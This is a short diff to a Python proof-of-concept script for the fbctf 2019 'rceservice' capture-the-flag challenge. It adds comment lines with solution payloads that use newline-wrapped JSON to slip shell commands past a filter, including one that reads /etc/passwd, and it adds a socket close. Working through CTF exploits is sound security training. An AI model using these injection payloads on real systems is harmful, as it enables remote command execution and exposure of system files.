@@ -7,6 +7,9 @@
 ## cat, ls, route, id
 ## curl 'http://challenges.fbctf.com:8085/?cmd=\{"cmd":"cat%20flag"\}'
 
+## Solution to fbctf19 rceservice: python3 poc.py -d "?cmd={%0a\"cmd\":\"ls%20-la\"%0a}"
+##           python3 poc.py -d "?cmd={%0a\"cmd\":\"%2fbin%2fcat%20%2fetc%2fpasswd\"%0a}"
+
 import argparse
 import socket
 
@@ -85,6 +88,8 @@ def send_tcp_request(host, port, request):
     print('\x1b[3;31;40m', end="") 
     print(response, end="")
     print('\x1b[0m')
+    
+    s.close()
 
     if b"Success!" in response:
         print('\x1b[6;30;42m' + 'Command executed successfully!' + '\x1b[0m')
